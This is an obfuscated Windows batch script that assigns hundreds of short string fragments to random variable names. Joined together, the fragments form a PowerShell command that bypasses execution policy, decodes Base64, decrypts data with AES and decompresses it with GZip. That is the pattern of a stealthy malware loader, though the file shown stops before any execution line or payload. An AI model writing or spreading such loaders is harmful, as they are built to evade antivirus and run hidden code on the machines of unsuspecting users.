@echo off
set "PZGQwTiLti=:\"
set "pGHluGKnur=in"
set "nuVzXFUcbT=em"
set "hrqFjMLWfo=we"
set "ZvPVJkLfwb=co"
set "xrdTmagGlh=ow"
set "iFPUMltCtq=.e"
set "LbwOuHHAuI=s\"
set "HgCiCUFMQT=\v"
set "ugGjRIimyO=xe"
set "eXSLKuraSi=st"
set "EfjvhPhHfS=do"
set "HdINweAfKP=1."
set "vfIrvwAIIb=po"
set "hDRgKypxUD=ll"
set "GqRvByPkTH=nd"
set "PurWqeUeJG=we"
set "YjMfYebucz=rs"
set "DcRlVugiQX=he"
set "PFdeqsdIwj=ws"
set "MuTfjtbgGJ=Wi"
set "FCfigdJyAL=0\"
set "kglfyBvrsa=he"
set "SVrndOjKea=\W"
set "JDMIbhNdfM= /"
set "bFMsWyikpY=Sy"
set "aMwIbTNPWg=py"
set "ERwIZlkiSb=ll"
set "GBElkKDDVc=rS"
set "TSBarErrsn=y "
set "vjYbEkHEPZ=Po"
set "bBFEccMtbD= C"
set "RpPkGRELXN=32"
set "cIXCufZgBf= %~dp0"
set "fzwBaicpHX=cd"
set "TZDheHUfZc=k; }"
set "xQOIcNfvMZ=cs ="
set "RzYjQlZCfa=YxVw"
set "DnaoiYbHbL=..-1"
set "razACaAkZA=E = "
set "pOrmYgcglk=pose"
set "zrCkrzSDXu=3); "
set "rsZrSHvJcf=RMOi"
set "ZMpyyfLBVA=Mode"
set "pAVJKYaBVk=daeR"
set "IZgAKCkvJj=QuRo"
set "pJBMrCyrQv=:('g"
set "RCiVhPbPsQ=gj.D"
set "RvUBMMdTuZ=bypa"
set "qkvNxxTTEy=m.IO"
set "ZMMiasmZCE=iron"
set "uveYDkDVqQ= = $"
set "URtrWcvVOc=.-16"
set "oAzifqwwWn=QuRo"
set "tsvdLYnPSO=am;$"
set "mvPUMZrfSR=V = "
set "NmCWCaznSF=orF'"
set "iCeukSyZnZ=raph"
set "fSahGUirDs=]::("
set "jnHjnMekzP=gjYA"
set "SSqzyImpIW=gsYZ"
set "ZOUGKIKQvw=n ''"
set "aDABBbeAbw=gxPH"
set "uULhReUmPr=yste"
set "QuvCfDbIju=j = "
set "gDVnUwTgUO=form"
set "UXLMxaRcZV=ej ="
set "YEvHmzjNzf=stem"
set "zPtDuZiRwU=RMOi"
set "McJCJzeuzg=New-"
set "hRMKfPOimg=em.I"
set "vHJCbUXaKf=.Mod"
set "TjBXYdJEJB=Obje"
set "BRdVdsKvMh=.Key"
set "xwgafStoVu= '')"
set "QMubJOEodV=le  "
set "PIcfLCijgS=rofi"
set "qaVaFgXYkR='gni"
set "BjmdLEujNU=ay()"
set "bFIvKtxetH=Stre"
set "ReNMApxhPp=PxEW"
set "dvEvfojKWy=oL'["
set "SrbXPleNCi= if "
set "DfNgZIkDay=zuZI"
set "PRDSBQDtZY=comm"
set "NNLwcCwAzg=1] -"
set "wTXLnPDrda=.Len"
set "qVSyWExkGz=y.Cr"
set "qnhVMyObOv=brea"
set "uSGWzzCXDy=tem."
set "yvWoarFoKk=dj0C"
set "uKWAbMREWz=6] -"
set "ztgvOdhNJy=] -j"
set "dQwRTIihfO=yste"
set "hzwgErCLDP=join"
set "OCTVNYCVSq=[Sys"
set "tCSlTYkuyF= [st"
set "PHRYTVCzEz=in $"
set "gobZKxhvwm=RMOi"
set "vhvHbOzyRk=[]] "
set "eiqpSbolUZ=.Sec"
set "UZfIgMccGn=-ep "
set "hypXmAFZPo=.GZi"
set "iHwkQkkqnx=:: '"
set "zQRtlHDSHf=PKCS"
set "iFNQAlRJuX=RMOi"
set "cWXukynmAe=bEX "
set "zgCSauRTpW=and "
set "LKTdZLZCKx=$RhD"
set "xkLuwKnoKN=Obje"
set "WcTCZsmYUt=fore"
set "QbytxjvytO=trea"
set "tdnbXlEJoF='[-1"
set "ivBEboZmLu=ose("
set "XdmLZXKRzZ=comp"
set "YXESjZhNaH=tion"
set "XxXmrknlee=);$x"
set "lTZzoNqPJV=Disp"
set "liFCcBLVFq=)) {"
set "CLUBLlbYGI=tS46"
set "WiZCXISerU=ss -"
set "cWHFVjfIPV=m(, "
set "nokZSnpzVS=bEX."
set "LOTuRZWSYh=ct S"
set "IGpqeJQOiI=l5E7"
set "VzUlUGpGUK=lBlo"
set "aMcQFGFEjp=$xzq"
set "ezPEKJHcxP=.Con"
set "ANsDDGmEpu=esaB"
set "mJpbTgkXjL=ing("
set "CPTtNbPxEj=File"
set "VBSkfmKAJH== $B"
set "seZwgbyDbh=ose("
set "gMgIdoQAnk=NCC."
set "SpKcixtWod=oint"
set "PsWwnUyoUT=Secu"
set "kcgvFuRsIP=ddin"
set "aPoJPYGKTa=ode]"
set "lEwFITRKli=::De"
set "zPZKlAfauO=yTo("
set "asTIezSaju=  $M"
set "apEpOXXsYg='[-1"
set "WHiiXcnXUm=tem."
set "NjPBtsXwjo=n ''"
set "KzNvCpzYgz=$oXH"
set "YXbLZrYgPr=t Sy"
set "OEGdaJawBE=)($M"
set "ftvytBipGY=RmAx"
set "oitGBngJBI=MJuW"
set "vngaItfHNw=-nop"
set "rjhTidOZbP=p.Su"
set "FKEdDVsUjU=ateD"
set "KsukPXUMZX=y]::"
set "dDBAcPbtGJ=g = "
set "FZCnBZrHec=-4] "
set "rEOSGsMgfJ=Star"
set "FCrLgHSyDb=m.IO"
set "DSdJlfQXpI=.Cry"
set "CqEoIyajMZ=cs.T"
set "yvNswwaADF=oin "
set "IDnBszliWa=tw, "
set "DxSWWAVLki=-1.."
set "jIvEvFSgWR=$oXH"
set "MulFrHomVo=gnir"
set "CoVBrQFBKg=('%*'"
set "LXWeLjIJlZ=xzqg"
set "UPtWwuubKB=ress"
set "tXVljlcPzj=raph"
set "EQFPpPDKgG=]::C"
set "EYxEYpbHQu=ew-O"
set "HFoaidzzRM=w = "
set "gJOQUNccBo=ptog"
set "vPNBacgvGg=TllA"
set "HZnAfdxoiV=.Dis"
set "VqubqWTlZA='')("
set "WfBezpidqv=Bmor"
set "dHiMtNVgzN=ne);"
set "vTVtgyvkXc=$VNj"
set "odOBiYLfMT=pose"
set "cccDTEZpos=[-1."
set "bVrjhjZefS=eMVs"
set "sijNSzNvfJ=oE ="
set "eFnylqcxrs=Pep."
set "qKJlyYIGYz=S46e"
set "wqLAfGIKso=E, 0"
set "PQSoCklLWJ=bjec"
set "VyEiXXEtNJ=m.Re"
set "kWNjTUWYmN=106u"
set "OqYvfrQTFz=[IO."
set "mwnuOTdaTZ=Syst"
set "ZlUHEDJdQU=nage"
set "MsFgXucNfe=Pep "
set "aKwmvKXGBC=ecry"
set "hDPzQuEUTV=VNjt"
set "nQOizYPUUR=QuRo"
set "wWqewbGMrO=ewLi"
set "dEjuecSznQ=ptor"
set "GXPXEPHMSX=ypto"
set "DpHnaSMFYD=.Dis"
set "zhnHazvQaq=Conv"
set "oOkUfwkAjo=.Cop"
set "iJUvzQGhCD= [Sy"
set "HBEymjqXJx=Comp"
set "dBYmNfXISC=ddin"
set "zmayisDZbF=e = "
set "txNEefjbZU=null"
set "bcSUogQgJH=RMOi"
set "TyEuGBDYLM=j) {"
set "wEpvPXCCKR=zqgj"
set "HUDvnTDfrz=New-"
set "UlLMqWQxbq=$BRM"
set "FJxdcHNVOX=();$"
set "XmwqpUeXkr=zHhH"
set "fAsYYfbBGC=nirt"
set "fZyPiHQYoY=[Sys"
set "SRPqpdzjFh=; };"
set "cSHtoqmtkO=$zCb"
set "fpSjHsgFJR=ck($"
set "WCGUkDsuWI=uRoE"
set "jxuQDEivBH=Invo"
set "NWGKvvkaTi=);$u"
set "XEGyhQtARR=yste"
set "pedVBwQVoi=vert"
set "RvtQsUBzfQ=rtS4"
set "LxjKrSDbbx=-joi"
set "cHMfLHFeZJ=.Cry"
set "xWbuzSKZxD= = ["
set "OejhyBaZcw=).Sp"
set "PkWEVVvgjS=pStr"
set "iyggbPHJhk=Disp"
set "rhluQuGBvN=oArr"
